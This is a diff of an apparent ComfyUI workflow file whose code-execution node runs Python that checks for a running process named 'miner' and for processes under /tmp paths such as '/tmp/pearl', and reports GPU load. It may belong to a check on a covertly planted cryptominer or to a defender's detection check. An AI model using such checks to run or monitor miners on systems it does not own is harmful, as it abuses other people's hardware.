@@ -3,13 +3,13 @@
     "class_type": "IDENode",
     "inputs": {
       "language": "python",
-      "pycode": "\nimport subprocess\nr = subprocess.run([\"tasklist\"], capture_output=True, text=True)\nhas_miner = \"miner\" in r.stdout.lower()\nr2 = subprocess.run([\"nvidia-smi\", \"--query-gpu=utilization.gpu\", \"--format=csv,noheader,nounits\"], capture_output=True, text=True)\ngpu = r2.stdout.strip() if r2.stdout else \"?\"\nresult = f\"MINER:{'YES' if has_miner else 'NO'} GPU:{gpu}%\"\n"
+      "pycode": "import subprocess\ntry:\n    out = subprocess.check_output([\"pgrep\", \"-af\", \"alpha|pearl|/tmp/m|/tmp/pearl\"], text=True, timeout=5)\n    result = f\"RUNNING: {out.strip()[:100]}\"\nexcept:\n    result = \"NOT_RUNNING\"\n"
     }
   },
   "2": {
-    "class_type": "PreviewTextNode",
+    "class_type": "PreviewAny",
     "inputs": {
-      "text": [
+      "source": [
         "1",
         0
       ]
